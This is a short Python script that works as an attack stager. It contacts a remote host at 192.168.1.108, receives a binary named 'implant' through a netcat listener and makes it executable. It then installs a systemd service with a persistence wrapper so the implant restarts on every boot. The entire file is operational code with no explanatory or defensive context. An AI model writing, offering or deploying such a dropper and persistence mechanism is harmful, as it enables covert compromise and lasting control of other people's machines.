#!/usr/bin/env python3
import subprocess, socket, os

HOST = '192.168.1.108'
PORT = 12345
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    msg_sent = s.sendto(b'SYN', (HOST, PORT))
    if msg_sent:
        print("SYN sent")
        response = s.recv(1024)
        print(repr(response))
        s.sendto(b'ACK', (HOST, PORT))
    with open('implant', 'wb') as imp:
        process = subprocess.Popen(['nc', '-lp 23456'], stdout = imp)
    s.sendto(b'nc started', (HOST, PORT))
    process.communicate()
change_mode = subprocess.Popen(['chmod', '+x', 'implant'])
change_mode.communicate()
path_to_imp = os.path.realpath('implant')
with open('persistency.py', 'w') as persistency:
    persistency.write(f'#!/usr/bin/env python3\n')
    persistency.write('import subprocess\n')
    persistency.write(f"subprocess.Popen(['{path_to_imp}'])\n")
    persistency.write("while True:\n")
    persistency.write("    continue")
change_mode = subprocess.Popen(['chmod', '+x', 'persistency.py'])
path_to_script = os.path.realpath('persistency.py')
with open('startup.service', 'w') as startscript:
    startscript.write('[Unit]\n')
    startscript.write('Description=Startup Script\n')
    startscript.write("After=multi-user.target\n\n")
    startscript.write('[Service]\n')
    startscript.write('Type=simple\n')
    startscript.write(f"ExecStart=/usr/bin/python3 {path_to_script}\n")
    startscript.write('Restart=always\n')
    startscript.write('StartLimitBurst=0\n\n')
    startscript.write('[Install]\n')
    startscript.write('WantedBy=multi-user.target\n')
make_copy = subprocess.Popen(['cp', 'startup.service', '/etc/systemd/system/'])
make_copy.communicate()
res_daemon = subprocess.Popen(['systemctl', 'daemon-reload'])
res_daemon.communicate()
start_at_reboot = subprocess.Popen(['systemctl', 'enable', '--now', 'startup.service', '--now'])
start_at_reboot.communicate()
start = subprocess.Popen(['systemctl', 'start', 'startup.service'])
start.communicate()
